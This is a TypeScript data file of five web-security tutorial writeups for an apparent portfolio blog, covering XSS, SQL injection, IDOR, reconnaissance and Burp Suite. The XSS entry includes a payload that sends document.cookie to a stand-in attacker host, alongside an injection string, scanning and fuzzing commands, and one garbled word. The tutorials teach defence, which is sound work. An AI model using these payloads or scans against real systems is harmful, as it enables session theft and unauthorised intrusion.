import { Writeup } from "@/types";

export const writeupsData: Writeup[] = [
  {
    slug: "understanding-xss-vulnerabilities",
    title: "Understanding Cross-Site Scripting (XSS): Types, Attack Vectors & Prevention",
    description: "A practical technical deep-dive into Reflected, Stored, and DOM-based XSS, payload construction, context awareness, and modern defense mechanisms.",
    category: "Web Security",
    date: "2026-09-10",
    readTime: "7 min read",
    author: "Faijan Ansari",
    featured: true,
    tags: ["XSS", "OWASP", "JavaScript", "WAPT", "Web Security"],
    content: `
### Introduction to Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) remains one of the most common web application security vulnerabilities. It occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing an attacker to execute arbitrary scripts in the context of a user's browser session.

### Core XSS Classifications

#### 1. Reflected XSS (Non-Persistent)
Reflected XSS arises when an application receives user input in an HTTP request and immediately includes that input in an unescaped HTTP response.

\`\`\`html
<!-- Example of vulnerable server-side rendering -->
<h2>Search results for: <?php echo $_GET['q']; ?></h2>
\`\`\`

**Attack Vector:**
\`\`\`html
https://example.com/search?q=<script>alert(document.cookie)</script>
\`\`\`

#### 2. Stored XSS (Persistent)
Stored XSS occurs when user input is saved in a database, message forum, comment field, or log file, and later displayed to other users without sanitization.

**Example Scenario:**
An attacker submits a comment containing a payload:
\`\`\`html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
\`\`\`
Every user visiting the comment section triggers the script payload.

#### 3. DOM-based XSS
DOM XSS occurs entirely within the client-side JavaScript. The vulnerability exists when JavaScript reads data from a user-controllable source (such as \`location.search\` or \`location.hash\`) and passes it to an execution sink (such as \`document.write()\`, \`element.innerHTML\`, or \`eval()\`).

\`\`\`javascript
// Vulnerable DOM Script
const params = new URLSearchParams(window.location.search);
const name = params.get("name");
document.getElementById("greeting").innerHTML = "Hello " + name;
\`\`\`

### Testing & Discovery Methodology

1. **Input Identification**: Map all user inputs (URL parameters, forms, HTTP headers, search inputs).
2. **Context Analysis**: Determine where the input renders in the HTML document:
   - Inside HTML tags: \`<div>USER_INPUT</div>\`
   - Inside HTML attributes: \`<input value="USER_INPUT">\`
   - Inside JavaScript blocks: \`<script>let data = 'USER_INPUT';</script>\`
3. **Filter & WAF Evasion**: Test how special characters (\`<\`, \`>\`, \`"\`, \`'\`, \`/\`) are encoded or filtered.

### Remediation & Defense

- **Context-Aware Encoding**: Convert dangerous characters into HTML entities (\`&\` -> \`&amp;\`, \`<\` -> \`&lt;\`).
- **Content Security Policy (CSP)**: Restrict script origins and disable inline scripts.
\`\`\`http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
\`\`\`
- **HttpOnly Cookies**: Prevent JavaScript from accessing session tokens via \`document.cookie\`.
    `,
  },
  {
    slug: "sql-injection-fundamentals",
    title: "SQL Injection Fundamentals: From In-Band to Time-Based Blind Exploitation",
    description: "A comprehensive guide on detecting SQL Injection flaws, analyzing query contexts, and extracting databases safely during security testing.",
    category: "VAPT",
    date: "2026-08-25",
    readTime: "9 min read",
    author: "Faijan Ansari",
    featured: true,
    tags: ["SQLi", "Database", "OWASP", "Burp Suite", "Pentesting"],
    content: `
### What is SQL Injection?

SQL Injection (SQLi) occurs when untrusted user input is directly concatenated into a database SQL query string without parametrization, enabling an attacker to alter the query's execution logic.

### Types of SQL Injection

#### 1. In-Band SQLi (Classic)
- **UNION-Based**: Appends results from custom \`SELECT\` queries using the \`UNION\` operator.
- **Error-Based**: Leverages database error messages to reveal schema information or data.

#### 2. Inferential SQLi (Blind)
- **Boolean-Based**: Observes differences in page responses (True vs. False conditions).
- **Time-Based**: Forces database delay functions (e.g., \`SLEEP(5)\` or \`pg_sleep(5)\`) to verify vulnerability.

### Practical Detection Example

Consider a vulnerable PHP backend:
\`\`\`php
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = " . $id;
\`\`\`

Submitting \`id=1 OR 1=1\` modifies the query to:
\`\`\`sql
SELECT * FROM products WHERE id = 1 OR 1=1;
\`\`\`
This forces the query to evaluate to true for all rows, leaking full database table records.

### Remediation

Always use **Prepared Statements (Parameterized Queries)**:

\`\`\`python
# Secure Python SQLite Example
cursor.execute("SELECT * FROM products WHERE id = ?", (user_input,))
\`\`\`
    `,
  },
  {
    slug: "idor-testing-methodology",
    title: "IDOR Testing Methodology: Finding Broken Object Level Authorization",
    description: "How to systematically identify and exploit Insecure Direct Object References (IDOR) across modern REST APIs and web applications.",
    category: "API Security",
    date: "2026-08-14",
    readTime: "6 min read",
    author: "Faijan Ansari",
    featured: true,
    tags: ["IDOR", "API Security", "Authorization", "Burp Suite"],
    content: `
### Understanding IDOR (API1:2023 - Broken Object Level Authorization)

Insecure Direct Object References (IDOR) occur when an application relies on client-provided object identifiers (IDs, UUIDs, usernames) to access database records without verifying if the requesting user possesses authorization for that specific resource.

### Common IDOR Attack Vectors

1. **Predictable Sequential IDs**:
   \`GET /api/v1/user/account?id=1004\` -> Change to \`id=1003\`

2. **UUID & Hash Enumeration**:
   Checking if static UUIDs are exposed in public profiles or responses.

3. **HTTP Verb Tampering**:
   If \`GET /api/documents/882\` yields 403 Forbidden, test \`POST\`, \`PUT\`, \`DELETE\`, or \`PATCH\`.

### Step-by-Step Testing Process with Burp Suite

1. Register two distinct user accounts (User A and User B).
2. Capture User A's API requests in Burp Suite Proxy.
3. Send requests to Burp Repeater.
4. Replace User A's session authorization token with User B's token while leaving User A's resource IDs in the parameters.
5. If the server returns User A's private data to User B, an IDOR vulnerability exists.

### Defense Strategies

- Enforce object-level authorization checks on every database access call.
- Use session-based mapping instead of accepting direct raw database IDs from client inputs.
    `,
  },
  {
    slug: "reconnaissance-methodology-web-pentesting",
    title: "Modern Reconnaissance Methodology: Attack Surface Mapping",
    description: "Step-by-step methodology for passive and active subdomain enumeration, port scanning, asset discovery, and service fingerprinting.",
    category: "Reconnaissance",
    date: "2026-07-30",
    readTime: "8 min read",
    author: "Faijan Ansari",
    featured: false,
    tags: ["Recon", "Subfinder", "Amass", "Nmap", "httpx"],
    content: `
### The Power of Reconnaissance

Reconnaissance is the foundation of effective offensive security testing. Thorough information gathering uncovers obscure, forgotten, or development assets that are frequently less secured than primary production endpoints.

### Reconnaissance Workflow Pipeline

1. **Passive Subdomain Enumeration**:
   Gather subdomains without sending direct traffic to target servers using public Certificate Transparency logs and OSINT sources.
   \`\`\`bash
   subfinder -d target.com -all -silent | tee subdomains.txt
   \`\`\`

2. **Probing Active HTTP Services**:
   Filter live web endpoints and discover active status codes and web technologies using \`httpx\`.
   \`\`\`bash
   cat subdomains.txt | httpx -title -tech-detect -status-code -mc 200,302,403
   \`\`\`

3. **Active Port & Service Scanning**:
   Use \`Nmap\` to identify running services and version banners on discovered host IPs.
   \`\`\`bash
   nmap -sV -sC -iL hosts.txt -oA nmap_recon_results
   \`\`\`

4. **Directory & Content Fuzzing**:
   Perform directory discovery using fast fuzzing utilities such as \`ffuf\`.
   \`\`\`bash
   ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
   \`\`\`
    `,
  },
  {
    slug: "burp-suite-essential-techniques",
    title: "Burp Suite Pro Techniques for Effective Web Application Testing",
    description: "Maximizing Burp Suite Efficiency: Repeater workflows, Match and Replace rules, Intruder configurations, and essential extensions.",
    category: "Tools",
    date: "2026-07-15",
    readTime: "5 min read",
    author: "Faijan Ansari",
    featured: false,
    tags: ["Burp Suite", "Tools", "WAPT", "Methodology"],
    content: `
### Key Burp Suite Workflows for Web Application Testers

Burp Suite is the industry-standard web proxy used by security engineers worldwide. Optimizing your workspace configuration saves hours during penetration testing engagements.

#### Essential Tips & Hacks:

1. **Match and Replace Rules**: Automatically inject custom headers (such as \`X-Forwarded-For: 127.0.0.1\` or custom Bearer tokens) into all outgoing traffic.
2. **Autorize Extension**: Automates authorization enforcement testing between different user roles in real-time while browsing the target application.
3. **Intruder Payload Sets**: Use Bступи payload markers for parameter fuzzing, credential stuffing, and header injection.
    `,
  },
];
